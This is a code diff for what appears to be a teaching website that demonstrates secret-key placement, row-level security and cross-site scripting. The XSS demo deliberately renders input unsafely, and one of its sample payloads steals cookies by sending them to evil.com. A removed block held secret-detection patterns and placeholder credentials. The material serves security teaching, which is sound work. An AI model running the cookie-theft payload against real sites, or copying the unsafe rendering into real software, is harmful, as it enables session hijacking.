@@ -40,117 +40,230 @@ function initFrontendBackendDemo() {
 
 // Secrets Scanner Demo
 function initSecretsDemo() {
-  const textarea = document.querySelector('#secretsDemo textarea');
-  const results = document.querySelector('#secretsDemo .scan-results');
-  if (!textarea || !results) return;
+  const secretInfo = document.querySelector('#secretsDemo .secret-info');
+  if (!secretInfo) return;
 
-  window.scanForSecrets = function(button) {
-    const code = textarea.value;
-    if (!code.trim()) {
-      results.innerHTML = '<p class="warning">Please paste some code to scan!</p>';
-      return;
+  const secretData = {
+    'supabase-public': {
+      title: 'Supabase Anon Key',
+      location: '✅ SAFE with VITE_',
+      explanation: 'Public by design. Use VITE_ prefix so it gets bundled to frontend. Protected by RLS policies.',
+      example: 'VITE_SUPABASE_ANON_KEY=eyJh...VCJ9',
+      color: 'success'
+    },
+    'supabase-service': {
+      title: 'Supabase Service Role Key',
+      location: '🚨 NO VITE_ PREFIX',
+      explanation: 'Bypasses all RLS! Keep in server .env file only (no VITE_ prefix).',
+      example: 'SUPABASE_SERVICE_ROLE_KEY=eyJh...VCJ9',
+      color: 'error'
+    },
+    'stripe-public': {
+      title: 'Stripe Public Key',
+      location: '✅ SAFE with VITE_',
+      explanation: 'Starts with pk_. Can only create payment intents, not charge. Use VITE_ prefix.',
+      example: 'VITE_STRIPE_PUBLIC_KEY=pk_test_51H...',
+      color: 'success'
+    },
+    'stripe-secret': {
+      title: 'Stripe Secret Key',
+      location: '🚨 NO VITE_ PREFIX',
+      explanation: 'Starts with sk_. Can charge cards! Keep server-only (no VITE_ prefix).',
+      example: 'STRIPE_SECRET_KEY=sk_test_51H...',
+      color: 'error'
+    },
+    'google-maps': {
+      title: 'Google Maps API Key',
+      location: '⚠️ VITE_ + domain restrictions',
+      explanation: 'Can use VITE_ prefix BUT must restrict to your domain in Google Console.',
+      example: 'VITE_GOOGLE_MAPS_KEY=AIza...WK',
+      color: 'warning'
+    },
+    'jwt-secret': {
+      title: 'JWT Signing Secret',
+      location: '🚨 NO VITE_ PREFIX',
+      explanation: 'Signs auth tokens. If leaked, anyone can fake users! Server .env only.',
+      example: 'JWT_SECRET=your-256-bit...',
+      color: 'error'
     }
+  };
 
-    const patterns = [
-      { name: 'AWS Access Key', regex: /AKIA[0-9A-Z]{16}/g, risk: 'HIGH' },
-      { name: 'API Key Pattern', regex: /api[_-]?key['\"]\\s*[:=]\\s*['\"]\\w+/gi, risk: 'HIGH' },
-      { name: 'Secret Key', regex: /secret[_-]?key['\"]\\s*[:=]\\s*['\"]\\w+/gi, risk: 'HIGH' },
-      { name: 'Password in Code', regex: /password['\"]\\s*[:=]\\s*['\"]\\w+/gi, risk: 'MEDIUM' },
-      { name: 'Token Pattern', regex: /token['\"]\\s*[:=]\\s*['\"]\\w+/gi, risk: 'MEDIUM' },
-      { name: 'GitHub Token', regex: /gh[pousr]_[A-Za-z0-9_]{36}/g, risk: 'HIGH' },
-      { name: 'JWT Token', regex: /eyJ[A-Za-z0-9_-]*\\.[A-Za-z0-9_-]*\\.[A-Za-z0-9_-]*/g, risk: 'MEDIUM' },
-    ];
+  window.showSecretInfo = function(secretType) {
+    const data = secretData[secretType];
+    if (!data) return;
 
-    let findings = [];
-    patterns.forEach(pattern => {
-      const matches = code.match(pattern.regex);
-      if (matches) {
-        findings.push({
-          ...pattern,
-          matches: matches.length,
-          examples: matches.slice(0, 3)
-        });
-      }
+    // Clear previous selections
+    document.querySelectorAll('.secret-card').forEach(card => {
+      card.classList.remove('selected');
     });
+    
+    // Mark current selection
+    document.querySelector(`[data-secret="${secretType}"]`).classList.add('selected');
 
-    if (findings.length === 0) {
-      results.innerHTML = '<p class="success">✅ No obvious secrets detected!</p>';
-    } else {
-      results.innerHTML = `
-        <div class="findings">
-          <h4>🚨 Potential Secrets Found:</h4>
-          ${findings.map(finding => `
-            <div class="finding ${finding.risk.toLowerCase()}">
-              <strong>${finding.name}</strong> (${finding.risk} risk)
-              <br>Found ${finding.matches} occurrence(s)
-              <br><code>${finding.examples[0]}...</code>
-            </div>
-          `).join('')}
+    secretInfo.innerHTML = `
+      <div class="secret-details ${data.color}">
+        <h4>${data.title}</h4>
+        <div class="location">${data.location}</div>
+        <p>${data.explanation}</p>
+        <div class="example">
+          <strong>Example:</strong>
+          <code>${data.example}</code>
         </div>
-      `;
-    }
+      </div>
+    `;
   };
-
-  // Add sample dangerous code
-  const sampleBtn = document.createElement('button');
-  sampleBtn.textContent = 'Load Sample Vulnerable Code';
-  sampleBtn.style.marginTop = '0.5rem';
-  sampleBtn.onclick = () => {
-    textarea.value = `
-const config = {
-  apiKey: "AKIAIOSFODNN7EXAMPLE",
-  secret_key: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
-  database_password: "super_secret_123",
-  jwt_token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
-};
-    `.trim();
-  };
-  textarea.parentNode.appendChild(sampleBtn);
 }
 
 // RLS Demo
 function initRLSDemo() {
-  let currentUser = 'A';
+  let databaseRecords = []; // All records in the "database"
+  let recordIdCounter = 1;
   
-  const tabs = document.querySelectorAll('#rlsDemo .user-tab');
-  const results = document.querySelector('#rlsDemo .rls-results');
+  const dataInput = document.querySelector('#rlsDemo #dataInput');
+  const dataOwner = document.querySelector('#rlsDemo #dataOwner');
+  const tableBody = document.querySelector('#rlsDemo #tableBody');
+  const currentUser = document.querySelector('#rlsDemo #currentUser');
+  const rlsEnabled = document.querySelector('#rlsDemo #rlsEnabled');
+  const resultsBody = document.querySelector('#rlsDemo #resultsBody');
+  const sqlDisplay = document.querySelector('#rlsDemo #sqlDisplay');
+  const securityWarning = document.querySelector('#rlsDemo #securityWarning');
+  const resultsTitle = document.querySelector('#rlsDemo #resultsTitle');
   
-  if (!tabs.length || !results) return;
+  if (!dataInput || !tableBody) return;
 
-  tabs.forEach(tab => {
-    tab.addEventListener('click', () => {
-      tabs.forEach(t => t.classList.remove('active'));
-      tab.classList.add('active');
-      currentUser = tab.dataset.user;
-      results.innerHTML = `<p>Switched to User ${currentUser}</p>`;
+  function formatTime(date) {
+    return date.toLocaleTimeString('en-US', { 
+      hour12: false, 
+      hour: '2-digit', 
+      minute: '2-digit',
+      second: '2-digit'
     });
-  });
+  }
 
-  window.testRLS = function(action, target) {
-    const isOwn = target === 'own';
-    const targetUser = isOwn ? currentUser : (currentUser === 'A' ? 'B' : 'A');
+  function updateDatabaseTable() {
+    tableBody.innerHTML = databaseRecords.map(record => 
+      `<tr>
+        <td>${record.id}</td>
+        <td>${record.owner}</td>
+        <td>${record.data}</td>
+        <td>${formatTime(record.created)}</td>
+      </tr>`
+    ).join('');
+  }
+
+  function updateQueryResults() {
+    const user = currentUser.value;
+    const rlsOn = rlsEnabled.checked;
     
-    // Simulate RLS behavior
-    const shouldSucceed = isOwn || (action === 'read' && Math.random() > 0.8); // Some read cross-contamination
+    let visibleRecords;
+    let sqlQuery;
     
-    const resultClass = shouldSucceed ? 'success' : 'error';
-    const resultIcon = shouldSucceed ? '✅' : '❌';
-    const resultText = shouldSucceed ? 'ALLOWED' : 'DENIED';
-    
-    const resultMsg = `
-      <div class="rls-result ${resultClass}">
-        ${resultIcon} User ${currentUser} → ${action.toUpperCase()} User ${targetUser}'s data: ${resultText}
-      </div>
-    `;
-    
-    results.innerHTML = resultMsg;
-    
-    if (!shouldSucceed && !isOwn) {
-      results.innerHTML += '<p class="security-note">✅ Good! RLS is working - users cannot access other users\' data.</p>';
-    } else if (shouldSucceed && !isOwn) {
-      results.innerHTML += '<p class="security-warning">⚠️ Security Issue! User can access other users\' data. Check your RLS policies!</p>';
+    if (rlsOn) {
+      // RLS filters automatically
+      visibleRecords = databaseRecords.filter(record => record.owner === user);
+      sqlQuery = `SELECT * FROM notes WHERE owner = '${user}'; -- RLS automatically adds this filter`;
+    } else {
+      // No RLS - all records visible (security vulnerability!)
+      visibleRecords = databaseRecords;
+      sqlQuery = `SELECT * FROM notes; -- ⚠️ NO FILTERING - ALL DATA EXPOSED!`;
     }
+    
+    // Update SQL display
+    sqlDisplay.innerHTML = `<code>${sqlQuery}</code>`;
+    
+    // Update results table
+    resultsBody.innerHTML = visibleRecords.map((record, index) => {
+      const isOwnRecord = record.owner === user;
+      const rowClass = rlsOn ? (isOwnRecord ? 'accessible' : 'blocked') : (isOwnRecord ? 'own-record' : 'exposed-record');
+      
+      return `<tr class="${rowClass}">
+        <td>${record.id}</td>
+        <td>${record.owner}</td>
+        <td>${record.data}</td>
+        <td>${formatTime(record.created)}</td>
+      </tr>`;
+    }).join('');
+    
+    // Update title and warnings
+    if (rlsOn) {
+      resultsTitle.textContent = `Query Results (${visibleRecords.length} rows) - RLS Protected`;
+      securityWarning.style.display = 'none';
+    } else {
+      resultsTitle.textContent = `Query Results (${visibleRecords.length} rows) - NO RLS PROTECTION`;
+      const exposedRecords = visibleRecords.filter(record => record.owner !== user);
+      if (exposedRecords.length > 0) {
+        securityWarning.style.display = 'block';
+        securityWarning.innerHTML = `
+          <strong>🚨 SECURITY VULNERABILITY!</strong><br>
+          User "${user}" can see ${exposedRecords.length} record(s) belonging to other users!<br>
+          This is why RLS is essential for data protection.
+        `;
+      } else {
+        securityWarning.style.display = 'none';
+      }
+    }
+  }
+
+  window.addDatabaseRecord = function() {
+    if (!dataInput || !dataOwner) return;
+    const data = dataInput.value.trim();
+    if (!data) return;
+    
+    const record = {
+      id: recordIdCounter++,
+      owner: dataOwner.value,
+      data: data,
+      created: new Date()
+    };
+    
+    databaseRecords.push(record);
+    dataInput.value = '';
+    
+    updateDatabaseTable();
+    // Don't auto-update query results - user must click query button
   };
+
+  window.runQuery = function() {
+    updateQueryResults();
+  };
+
+  window.resetDatabase = function() {
+    databaseRecords = [];
+    recordIdCounter = 1;
+    updateDatabaseTable();
+    
+    // Reset query results to initial state
+    resultsTitle.textContent = 'Query Results';
+    sqlDisplay.innerHTML = '<code>Click "SELECT * FROM notes" to run query</code>';
+    resultsBody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted); font-style: italic;">No query executed yet</td></tr>';
+    securityWarning.style.display = 'none';
+  };
+
+  // Add Enter key support
+  if (dataInput) {
+    dataInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') {
+        addDatabaseRecord();
+      }
+    });
+  }
+
+  // Remove real-time updates - only update when query button is clicked
+
+  // Initialize with some sample data
+  databaseRecords = [
+    { id: 1, owner: 'User A', data: 'My secret project notes', created: new Date(Date.now() - 120000) },
+    { id: 2, owner: 'User B', data: 'Personal diary entry', created: new Date(Date.now() - 60000) }
+  ];
+  recordIdCounter = 3;
+  
+  updateDatabaseTable();
+  
+  // Initialize query results area with prompt to run query
+  resultsTitle.textContent = 'Query Results';
+  sqlDisplay.innerHTML = '<code>Click "SELECT * FROM notes" to run query</code>';
+  resultsBody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted); font-style: italic;">No query executed yet</td></tr>';
+  securityWarning.style.display = 'none';
 }
 
 // XSS Demo (Enhanced from existing)
@@ -165,8 +278,51 @@ function initXSSDemo() {
 
   btnInsecure?.addEventListener('click', () => {
     // Intentionally unsafe for demo
-    output.innerHTML = input.value;
+    const userInput = input.value;
+    output.innerHTML = userInput;
     output.className = 'xss-output insecure';
+    
+    // Simulate XSS execution for demo purposes
+    // Check if input contains XSS patterns and simulate their execution
+    if (userInput.includes('<script>') || userInput.includes('onerror=') || userInput.includes('onload=') || userInput.includes('document.cookie') || userInput.includes('fetch(')) {
+      // Add visual indicator that XSS would have executed
+      setTimeout(() => {
+        // Show XSS execution warning
+        const xssWarning = document.createElement('div');
+        xssWarning.className = 'xss-executed';
+        
+        // Check if it's a cookie theft attack for specific warning
+        let warningMessage = '🚨 XSS EXECUTED! In a real app, malicious code would run here! 🚨';
+        if (userInput.includes('document.cookie') || userInput.includes('fetch(')) {
+          warningMessage = '🍪 COOKIE THEFT ATTACK! Session cookies would be stolen and sent to evil.com! 🚨';
+        }
+        
+        xssWarning.innerHTML = warningMessage;
+        xssWarning.style.cssText = `
+          background: red; 
+          color: white; 
+          padding: 10px; 
+          border: 2px solid darkred; 
+          border-radius: 5px; 
+          margin: 10px 0; 
+          animation: pulse 1s infinite;
+          font-weight: bold;
+        `;
+        output.appendChild(xssWarning);
+        
+        // Simulate page background flash
+        document.body.style.backgroundColor = '#ff000033';
+        setTimeout(() => {
+          document.body.style.backgroundColor = '';
+        }, 1000);
+        
+        // Show alert after visual effects
+        setTimeout(() => {
+          alert('🚨 XSS Attack Simulated! In a real application, malicious JavaScript would have executed.');
+        }, 500);
+        
+      }, 100);
+    }
   });
 
   btnSecure?.addEventListener('click', () => {
@@ -186,14 +342,38 @@ function initXSSDemo() {
   samplesDiv.className = 'xss-samples';
   samplesDiv.innerHTML = `
     <details>
-      <summary>Sample XSS Payloads (for testing)</summary>
+      <summary>▼ Sample XSS Payloads (for testing)</summary>
       <div class="sample-buttons">
-        <button onclick="document.getElementById('xssInput').value = '&lt;img src=x onerror=alert(\\\\'XSS!\\\\')&gt;'">Image XSS</button>
-        <button onclick="document.getElementById('xssInput').value = '&lt;script&gt;alert(\\\\'XSS!\\\\')&lt;/script&gt;'">Script Tag</button>
-        <button onclick="document.getElementById('xssInput').value = '&lt;svg onload=alert(\\\\'XSS!\\\\')&gt;'">SVG XSS</button>
+        <button type="button" data-payload="image">Image XSS</button>
+        <button type="button" data-payload="script">Script Tag</button>
+        <button type="button" data-payload="svg">SVG XSS</button>
+        <button type="button" data-payload="cookie">Cookie Theft</button>
       </div>
     </details>
   `;
+  
+  // Add event listeners for sample buttons
+  const sampleButtons = samplesDiv.querySelectorAll('button[data-payload]');
+  sampleButtons.forEach(btn => {
+    btn.addEventListener('click', () => {
+      const payload = btn.dataset.payload;
+      switch(payload) {
+        case 'image':
+          input.value = '<img src=x onerror="this.style.backgroundColor=\'red\'; this.style.width=\'200px\'; this.style.height=\'50px\'; this.innerHTML=\'🚨 XSS EXECUTED! 🚨\';">';
+          break;
+        case 'script':
+          input.value = '<script>document.body.style.backgroundColor="red"; setTimeout(() => document.body.style.backgroundColor="", 2000);</script>';
+          break;
+        case 'svg':
+          input.value = '<svg onload="this.innerHTML=\'<text x=10 y=20 fill=red>🚨 XSS EXECUTED! 🚨</text>\'; this.style.backgroundColor=\'yellow\';" width="200" height="30">';
+          break;
+        case 'cookie':
+          input.value = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\' + document.cookie)">';
+          break;
+      }
+    });
+  });
+  
   input.parentNode.appendChild(samplesDiv);
 }
 
